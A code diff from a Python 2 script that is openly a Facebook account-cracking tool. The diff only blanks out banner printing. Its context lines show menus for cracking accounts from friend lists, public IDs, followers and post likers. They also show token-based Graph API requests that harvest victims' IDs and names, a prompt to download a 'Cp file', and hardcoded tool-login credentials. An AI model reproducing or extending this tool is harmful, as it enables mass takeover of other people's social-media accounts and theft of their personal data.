@@ -118,7 +118,7 @@ def tool_login():
             print 
             logging()
             os.system("clear")
-            print banner
+            print 
             print 
             print ("[✓] Username : AWAIS (Correct)")
             print ("[✓] Password : PAHTON  (Correct)")
@@ -152,7 +152,7 @@ def login_select():
     select = raw_input("\nChoose Option >>> ")
     if select =="1":
         os.system("clear")
-        print banner
+        print 
         print 
         print ("Login With Token").center(50)
         print
@@ -292,7 +292,7 @@ def crack():
 		time.sleep(1)
 		login()
 	os.system("clear")
-	print banner
+	print 
 	print ("[1] Crack From Friend List")
 	print ("[2] Crack From Public ID")
 	print ("[3] Crack From Followers")
@@ -307,7 +307,7 @@ def crack2():
 	cps=[]
 	if select=="1":
 		os.system("clear")
-		print banner
+		print 
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
 		z = json.loads(r.text)
 		for s in z["data"]:
@@ -317,10 +317,10 @@ def crack2():
 			id.append(uid+'|'+nm)
 	elif select =="2":
 		os.system("clear")
-		print banner
+		print 
 		idt = raw_input("[+] Input ID : ")
 		os.system("clear")
-		print banner
+		print 
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
@@ -341,7 +341,7 @@ def crack2():
 		print banner
 		idt = raw_input("[+] Input ID : ")
 		os.system("clear")
-		print banner
+		print 
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
@@ -362,7 +362,7 @@ def crack2():
 		print banner
 		idt = raw_input("[!] Input Post ID : ")
 		os.system("clear")
-		print banner
+		print 
 		print('')
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
@@ -533,7 +533,7 @@ def down():
     dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
     if dow =="yes" or dow =="y":
         os.system("clear")
-        print banner
+        print 
         download()
         print('')
         print("[!] Please Give Storage Permission If Ask")
@@ -560,7 +560,7 @@ def cnumber():
 		time.sleep(1)
 		login()
 	os.system("clear")
-	print banner
+	print 
 	print ("[1] Crack Numbers From Friends")
 	print ("[2] Crack Numbers From Public ID")
 	print ("[3] Crack Numbers From Followers")
@@ -606,10 +606,10 @@ def cnumber2():
 			id.append(uid+'|'+nm)
 	elif select =="3":
 		os.system("clear")
-		print banner
+		print 
 		idt = raw_input("[+] Input ID : ")
 		os.system("clear")
-		print banner
+		print 
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
